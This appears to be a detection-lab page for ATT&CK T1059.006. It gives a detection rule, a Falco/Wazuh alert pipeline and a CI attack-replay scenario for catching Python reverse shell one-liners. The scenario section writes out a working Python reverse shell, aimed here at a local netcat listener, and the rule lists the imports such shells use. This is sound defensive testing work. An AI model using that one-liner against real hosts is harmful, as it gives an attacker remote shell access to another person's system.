# T1059.006 — Python inline socket/subprocess execution

| | |
|---|---|
| **ATT&CK** | [T1059.006](https://attack.mitre.org/techniques/T1059/006/) |
| **Tactic** | Execution |
| **Severity** | high |
| **Engine** | Falco → `DLL Reverse Shell` |
| **Automated test** | ✅ attack replayed + alert asserted in CI |

## What it detects

Detects python invoked with -c importing socket/subprocess/pty — the classic python reverse shell one-liner.

## Detection logic

```yaml
selection:
  Image|endswith:
  - /python
  - /python2
  - /python3
  CommandLine|contains:
  - import socket
  - import subprocess
  - import pty
condition: selection
```

Falco (eBPF, host syscalls) raises **`DLL Reverse Shell`** from the custom rule in [`detections/falco/dll_rules.yaml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/falco/dll_rules.yaml). Falco writes its JSON events to a shared volume; the `target-linux` Wazuh agent tails that file, so the alert lands in the Wazuh indexer as a `1009xx` rule ([`0900-falco.xml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/wazuh-native/0900-falco.xml)), matched on `data.rule`.

## Attack scenario — `./lab attack T1059.006`

*Python reverse shell one-liner (connects to a local listener, exits)*

```bash
(timeout 5 nc -l -p 9998 >/dev/null 2>&1 &) ; sleep 1 ;
timeout 3 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",9998));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])' || true
```

`./lab verify T1059.006` then asserts the alert reached the indexer.
